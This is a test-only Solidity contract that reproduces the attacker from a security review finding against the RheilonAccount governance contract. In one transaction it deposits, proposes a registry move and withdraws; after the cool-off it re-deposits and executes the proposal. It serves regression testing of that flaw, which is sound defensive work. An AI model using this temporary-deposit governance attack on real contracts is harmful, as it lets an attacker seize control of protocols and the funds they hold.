// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {RheilonAccount} from "../RheilonAccount.sol";

/// Test-only. The attacker from review finding GHSA-3chj-vh32-38qv: a member that stages a proposal inside one
/// transaction (deposit, propose, withdraw) and strikes after the cool-off in another (deposit, execute, leave).
contract StagingMember {
    function deposit(RheilonAccount a, IERC20 usdg, uint256 amount) external {
        usdg.approve(address(a), amount);
        a.deposit(amount);
    }

    function stage(RheilonAccount a, IERC20 usdg, uint256 capital, address registry_) external returns (uint256 p1) {
        usdg.approve(address(a), capital);
        uint256 minted = a.deposit(capital);
        p1 = a.propose(RheilonAccount.Kind.MoveRegistry, abi.encode(registry_), "move to v2 registry");
        a.withdraw(minted);
    }

    function strike(RheilonAccount a, IERC20 usdg, uint256 capital, uint256 p1) external {
        usdg.approve(address(a), capital);
        a.deposit(capital);
        a.execute(p1);
    }
}
